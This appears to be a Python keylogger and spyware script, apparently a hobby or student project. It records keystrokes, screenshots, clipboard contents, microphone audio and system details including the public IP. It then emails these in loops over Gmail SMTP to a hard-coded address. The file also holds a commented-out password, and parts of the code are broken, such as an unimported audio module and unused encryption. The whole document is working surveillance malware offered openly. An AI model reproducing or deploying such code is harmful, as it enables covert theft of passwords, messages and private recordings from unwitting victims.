import socket
import time
import platform
import os
import win32clipboard
from scipy.io.wavfile import write
from cryptography.fernet import Fernet
from pynput.keyboard import Key,Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from threading import Thread
import getpass
username=getpass.getuser()
from requests import get
from multiprocessing import Process,freeze_support

from PIL import ImageGrab

import smtplib,ssl

sys_info="sys.txt"
audio_info="audio.wav"
clipb_info="clip.txt"
scr_info="scr.png"
keys_info="keys.txt"

sys_info_enc="enc_sys.txt"
clipb_info_enc="enc_clip.txt"
keys_info_enc="enc_keys.txt"
file_path="C:\\Users\\KIIT\\PycharmProjects\\pythonProject1\\keyloggerProj"
count=0
print('''
  _________  ___ ___     _____   ________   ________   __      __
 /   _____/ /   |   \   /  _  \  \______ \  \_____  \ /  \    /  \
 \_____  \ /    ~    \ /  /_\  \  |    |  \  /   |   \\   \/\/   /
 /        \\    Y    //    |    \ |    `   \/    |    \\        /
/_______  / \___|_  / \____|__  //_______  /\_______  / \__/\  /
        \/        \/          \/         \/         \/       \/
''')
with open("enc_key.txt","r") as f:
    key=f.read()
    print(key)
keys=[]
email_add=input("Enter email: ")
#pwd="ryanjames8402"
pwd=getpass.getpass(prompt='Password: ',stream=None)
toadd="ryjames4201@gmail.com"
#function to get screenshots
def scrnshot():
    ImageGrab.grab().save(scr_info)
scrnshot()
def microphoneData():
    fs=44100
    durn=10#in seconds
    record=sd.rec(int(durn *fs),samplerate=fs,channels=2)
    sd.wait()
    write (audio_info,fs,record)
#function to get access from and send to email
def sndEmail(filename,attached,toaddr):
    fromaddr=email_add
    msg=MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=toaddr
    msg['Subject']="Keys Logged"
    body="Body"
    msg.attach(MIMEText(body,'plain'))#for attachments
    attached=open(attached,'rb')
    b=MIMEBase('application','octet-stream')
    b.set_payload(attached.read())
    encoders.encode_base64(b)
# the Content-Disposition response header is a header indicating if the content is expected to be
# displayed inline in the browser, that is, as a Web page or as part of a Web page, or as an attachment,
# that is downloaded and saved locally.
    b.add_header('Content-Disposition',"attachment; filename=%s"%filename)
    msg.attach(b)
    s=smtplib.SMTP_SSL('smtp.gmail.com',465)#outgoing smtp server and its port number
    #s.starttls()
    s.login(fromaddr,pwd)
    txt=msg.as_string()#converting the multipart message to a string
    s.sendmail(fromaddr,toaddr,txt)
    s.quit()
#gives system and computer info
def syst_info():
    with open(sys_info,"a") as f:
        host=socket.gethostname()
        ip=socket.gethostbyname(host)
        try:
            public_ip=get("https://api.ipify.org").content
            f.write("Public IP Address:"+public_ip)
        except Exception:
            f.write("\nCouldn't retrieve public ip address\n")
        f.write("Processor: "+platform.processor()+'\n'+"System: "+platform.system()+" version: "+platform.version()+"\n")
        f.write("Machine: "+platform.machine()+'\n')
        f.write("Hostname: "+host+'\n')
        f.write("Private IP Address: "+ip+'\n')
syst_info()

#get clipboard information
def clipboard():
    with open(clipb_info,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Data: "+data+'\n')
        except:
            f.write("\nImproper recording\n")
clipboard()
time_interv=15
iterations=0
stop_time=time.time()+time_interv
while iterations<3:
    crtTime = time.time()


    def keyPressed(typed_key):
        global keys,count
        print(typed_key)
        keys.append(typed_key)
        count+=1
        if count>=1:
            count=0
            opFile(keys)
            keys=[]
    def opFile(keys):
        with open(keys_info,"a") as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find("space")>0:
                   f.write(" ")
                   f.close()
                elif k.find("Key")==-1:
                    f.write(k)
                    f.close()
    def release(key):
        if key==Key.esc:
            return False
        if crtTime>stop_time:
            return False
    with Listener(on_press=keyPressed,on_release=release) as listnr:
        listnr.join()
    if crtTime>stop_time:
        sndEmail(keys_info,keys_info,toadd)
        with open(keys_info,"w") as f:
            f.write("")
        scrnshot()
        sndEmail(scr_info,scr_info,toadd)
        microphoneData()
        sndEmail(audio_info,audio_info,toadd)
        clipboard()
        iterations+=1
        crtTime=time.time()
        stop_time=crtTime+time_interv